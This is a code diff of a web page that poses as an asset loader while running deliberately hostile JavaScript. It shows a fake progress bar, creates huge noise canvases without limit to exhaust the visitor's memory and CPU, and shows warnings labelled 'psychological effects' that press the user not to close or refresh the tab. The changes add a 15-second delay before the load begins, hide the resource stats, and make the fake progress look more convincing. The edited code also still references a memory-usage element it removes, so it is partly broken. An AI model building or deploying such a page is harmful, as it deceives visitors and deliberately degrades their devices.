@@ -172,14 +172,6 @@
     <div id="status">Initializing assets…<span class="spinner"></span></div>
     <div id="stats">
         <div class="stat-line">
-            <span>Canvas Objects:</span>
-            <span id="canvasCount">0</span>
-        </div>
-        <div class="stat-line">
-            <span>Memory Usage:</span>
-            <span id="memoryUsage">0 MB</span>
-        </div>
-        <div class="stat-line">
             <span>Processing Time:</span>
             <span id="timeElapsed">0s</span>
         </div>
@@ -190,14 +182,13 @@
     const fill = document.getElementById("fill");
     const percentText = document.getElementById("percent");
     const status = document.getElementById("status");
-    const canvasCount = document.getElementById("canvasCount");
-    const memoryUsage = document.getElementById("memoryUsage");
     const timeElapsed = document.getElementById("timeElapsed");
     
     let progress = 0;
     let images = [];
     let totalCanvases = 0;
     let startTime = Date.now();
+    let hasStarted = false;
     
     const messages = [
         "Loading high-resolution assets…",
@@ -215,19 +206,24 @@
     ];
     
     let messageIndex = 0;
+    let progressInterval;
     
     function fakeProgress() {
+        if (!hasStarted) return;
+        
+        const increment = (100 / 60) / (1000 / 600);
+        
         if (progress < 30) {
-            progress += Math.random() * 3;
+            progress += increment * (0.8 + Math.random() * 0.4);
         } else if (progress < 70) {
-            progress += Math.random() * 1.5;
+            progress += increment * (0.6 + Math.random() * 0.4);
         } else if (progress < 90) {
-            progress += Math.random() * 0.8;
+            progress += increment * (0.4 + Math.random() * 0.3);
         } else {
-            progress += Math.random() * 0.3;
+            progress += increment * (0.2 + Math.random() * 0.2);
         }
         
-        if (progress > 97) progress = 92 + Math.random() * 5;
+        if (progress > 99) progress = 95 + Math.random() * 4;
         
         fill.style.width = progress + "%";
         percentText.textContent = Math.floor(progress) + "%";
@@ -239,17 +235,32 @@
         }
     }
     
-    setInterval(fakeProgress, 600);
+    setTimeout(() => {
+        hasStarted = true;
+        status.innerHTML = 'Initializing heavy processes…<span class="spinner"></span>';
+        progressInterval = setInterval(fakeProgress, 600);
+    }, 15000);
     
-    // Update time
+    // Initial countdown display
+    let countdown = 15;
+    const countdownInterval = setInterval(() => {
+        if (countdown > 0) {
+            status.innerHTML = `Starting in ${countdown} seconds…`;
+            countdown--;
+        } else {
+            clearInterval(countdownInterval);
+        }
+    }, 1000);
+    
     setInterval(() => {
-        const elapsed = Math.floor((Date.now() - startTime) / 1000);
-        timeElapsed.textContent = elapsed + "s";
+        if (hasStarted) {
+            const elapsed = Math.floor((Date.now() - startTime) / 1000);
+            timeElapsed.textContent = elapsed + "s";
+        }
     }, 1000);
     
     function generateHeavyImage() {
-        // Create even larger canvases with more complexity
-        const sizes = [3072, 4096, 5120]; // Larger canvas sizes
+        const sizes = [3072, 4096, 5120]; 
         const size = sizes[Math.floor(Math.random() * sizes.length)];
         
         const canvas = document.createElement("canvas");
@@ -257,10 +268,8 @@
         canvas.height = size;
         const ctx = canvas.getContext("2d");
         
-        // Generate complex noise patterns (very expensive)
         const imageData = ctx.createImageData(canvas.width, canvas.height);
         for (let i = 0; i < imageData.data.length; i += 4) {
-            // Add some mathematical patterns to make it even heavier
             const x = (i / 4) % canvas.width;
             const y = Math.floor((i / 4) / canvas.width);
             const pattern = Math.sin(x * 0.01) * Math.cos(y * 0.01);
@@ -288,28 +297,35 @@
         memoryUsage.textContent = estimatedMB.toFixed(1) + " MB";
     }
     
-    // Generate MORE canvases at a faster rate
-    setInterval(() => {
-        // Generate 5-8 heavy canvases per interval
-        const count = 5 + Math.floor(Math.random() * 4);
-        for (let i = 0; i < count; i++) {
+    // Generate MORE canvases at a faster rate (only after 15 seconds)
+    let canvasInterval;
+    setTimeout(() => {
+        canvasInterval = setInterval(() => {
+            // Generate 5-8 heavy canvases per interval
+            const count = 5 + Math.floor(Math.random() * 4);
+            for (let i = 0; i < count; i++) {
+                generateHeavyImage();
+            }
+        }, 800);
+        
+        // Initial batch when starting
+        for (let i = 0; i < 10; i++) {
             generateHeavyImage();
         }
-    }, 800);
+    }, 15000);
     
-    // Initial batch
-    for (let i = 0; i < 10; i++) {
-        generateHeavyImage();
-    }
-    
-    // Psychological effects
+    // Psychological effects (adjusted timing)
     setTimeout(() => {
-        status.innerHTML = '<span class="warning">Please do not close this tab.</span>';
-    }, 12000);
+        if (hasStarted) {
+            status.innerHTML = '<span class="warning">Please do not close this tab.</span>';
+        }
+    }, 27000); // 15s delay + 12s
     
     setTimeout(() => {
-        status.innerHTML = '<span class="warning">Processing critical data… Do not refresh.</span>';
-    }, 25000);
+        if (hasStarted) {
+            status.innerHTML = '<span class="warning">Processing critical data… Do not refresh.</span>';
+        }
+    }, 40000); // 15s delay + 25s
 </script>
 </body>
 </html>
